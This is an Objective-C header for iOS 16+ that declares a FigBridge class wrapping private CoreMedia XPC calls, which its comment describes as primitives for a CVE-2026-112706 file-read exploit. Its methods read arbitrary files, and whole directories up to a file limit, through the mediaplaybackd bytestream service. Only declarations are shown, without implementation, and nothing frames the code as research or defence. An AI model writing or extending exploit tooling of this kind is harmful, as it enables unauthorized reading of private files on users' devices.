// FigBridge.h
// lang: ObjC, file: FigBridge.h, target: iOS 16+
// Private CoreMedia Fig* XPC primitives for CVE-2026-112706 file-read.

#pragma once
#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@interface FigBridge : NSObject

/// Read one file via mediaplaybackd bytestream XPC. Returns raw bytes on success.
+ (nullable NSData *)readFileAtURL:(NSURL *)fileURL
                             error:(NSError *_Nullable *_Nullable)error NS_SWIFT_NOTHROW;

/// Walk a remote directory and read up to maxFiles entries.
/// Returns { filename → bytes } dict; nil on total failure.
+ (nullable NSDictionary<NSString *, NSData *> *)readDirectoryAtPath:(NSString *)path
                                                              maxFiles:(NSUInteger)maxFiles
                                                                 error:(NSError *_Nullable *_Nullable)error NS_SWIFT_NOTHROW;

@end

NS_ASSUME_NONNULL_END
